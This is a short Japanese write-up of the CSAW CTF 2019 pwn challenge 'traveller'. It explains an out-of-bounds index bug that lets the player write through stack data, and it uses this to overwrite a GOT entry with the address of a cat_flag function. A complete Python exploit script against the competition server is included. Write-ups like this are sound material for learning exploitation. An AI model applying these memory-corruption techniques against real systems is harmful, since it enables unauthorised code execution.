# [pwn 200pts] traveller - CSAW CTF Qualification 2019
64ビットバイナリで、PIEやRELROなどは無効です。
```
$ checksec -f traveller
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   92 Symbols     No       0               6       traveller
```
始めにargcのアドレスが渡されます。
その後add, change, deleteなどヒープ系っぽい処理があります。脆弱性自体は2つあり、1つはOOB、もう1つはoff-by-nullです。OOBでスタックのアドレスを参照すれば、そこを構造体として読むので、適当なアドレスとサイズがスタック上に存在すれば、そのアドレスにデータを書き込めます。したがって、スタック上に
```
addr+0x00: addr+delta
addr+0x08: size
```
のようにスタック上を指すアドレスがあれば、そこに新しい構造を書き込めるのでGOT overwriteに持ち込めます。なお、`cat_flag`関数があったので、適当な関数のGOTをこの関数アドレスで上書きしましょう。
```python
from ptrlib import *
import time

def change(index, data):
    sock.sendlineafter("> ", "2")
    sock.sendafter(": ", str(index))
    sock.send(data)
    return

def calc_offset(addr):
    assert addr % 8 == 0
    return 0x8000000000000000 | ((addr - elf.symbol("trips")) // 8)

elf = ELF("./traveller")
#sock = Process(["stdbuf", "-o0", "-i0", "./traveller"])
#sock = Socket("localhost", 9999)
sock = Socket("pwn.chal.csaw.io", 1003)

# leak stack address
sock.recvline()
sock.recvline()
addr_argc = int(sock.recvline(), 16)
logger.info("&argc = " + hex(addr_argc))

# prepare
delta = 124
change(calc_offset(addr_argc - delta), b'A' * 8 + p64(addr_argc + 36) + p64(elf.got("fgets") - 8) + p64(0x20))

# change
change(calc_offset(addr_argc + 28), b'A' * 8 + p64(elf.symbol("cat_flag")))

sock.interactive()
```

# 感想
まぁそんなに難しくないですね。
